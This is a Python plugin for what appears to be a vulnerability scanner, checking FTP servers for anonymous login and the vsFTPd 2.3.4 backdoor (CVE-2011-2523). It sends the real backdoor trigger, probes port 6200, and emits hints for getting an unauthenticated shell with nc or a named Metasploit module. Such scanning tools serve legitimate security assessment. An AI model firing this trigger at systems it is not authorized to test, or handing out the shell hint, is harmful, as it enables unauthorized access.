# plugins/ftp_plugin.py
from .plugin_base import PluginBase
import socket
import time

VSFTPD_BACKDOOR_VERSION = "2.3.4"
BACKDOOR_PORT = 6200
BACKDOOR_TRIGGER = b"USER backdoor:)\r\nPASS anything\r\n"

class FTPPlugin(PluginBase):
    name = "FTP Backdoor Check"
    applicable_services = ["FTP"]

    def run(self, target, port, banner=None):
        notes = []
        risk = "LOW"
        exploit_hint = None

        # --- Step 1: Check for vsFTPd 2.3.4 in banner ---
        is_vulnerable_version = False
        if banner and "vsftpd 2.3.4" in banner.lower():
            is_vulnerable_version = True
            notes.append("vsFTPd 2.3.4 detected — known backdoor version (CVE-2011-2523).")
            risk = "CRITICAL"
            exploit_hint = "Metasploit: use exploit/unix/ftp/vsftpd_234_backdoor"

        # --- Step 2: Check for anonymous FTP ---
        anon_result = self._check_anonymous(target, port)
        if anon_result:
            notes.append("Anonymous FTP login accepted — unauthenticated read access possible.")
            if risk == "LOW":
                risk = "HIGH"

        # --- Step 3: Probe for live backdoor on port 6200 ---
        if is_vulnerable_version:
            backdoor_live = self._probe_backdoor(target, port)
            if backdoor_live:
                notes.append(f"BACKDOOR CONFIRMED LIVE on port {BACKDOOR_PORT} — shell accessible without credentials.")
                risk = "CRITICAL"
                exploit_hint = (
                    f"Backdoor shell open on port {BACKDOOR_PORT}. "
                    f"Connect directly: nc {target} {BACKDOOR_PORT} "
                    f"OR Metasploit: use exploit/unix/ftp/vsftpd_234_backdoor"
                )
            else:
                notes.append(f"Backdoor port {BACKDOOR_PORT} not responding — may require trigger or already patched.")

        if not notes:
            notes.append("No critical FTP issues detected.")
            risk = "LOW"

        return {
            "plugin": self.name,
            "risk": risk,
            "notes": " | ".join(notes),
            "exploit_hint": exploit_hint
        }

    def _check_anonymous(self, target, port):
        """Attempt anonymous FTP login."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3)
                s.connect((target, port))
                s.recv(1024)  # banner
                s.sendall(b"USER anonymous\r\n")
                resp = s.recv(1024).decode(errors="ignore")
                if "331" in resp:  # 331 = password required, anonymous accepted
                    s.sendall(b"PASS guest@\r\n")
                    resp2 = s.recv(1024).decode(errors="ignore")
                    if "230" in resp2:  # 230 = login successful
                        return True
        except Exception:
            pass
        return False

    def _probe_backdoor(self, target, port):
        """
        Trigger the vsFTPd 2.3.4 backdoor by sending :) in the username,
        then check if port 6200 opens within a short window.
        This does NOT execute any commands — it only checks if the port opens.
        """
        try:
            # Step 1: Send the backdoor trigger
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3)
                s.connect((target, port))
                s.recv(1024)  # read banner
                s.sendall(BACKDOOR_TRIGGER)
                time.sleep(0.3)  # give the backdoor time to open

            # Step 2: Check if port 6200 is now open
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as probe:
                probe.settimeout(2)
                result = probe.connect_ex((target, BACKDOOR_PORT))
                if result == 0:
                    return True

        except Exception:
            pass

        return False
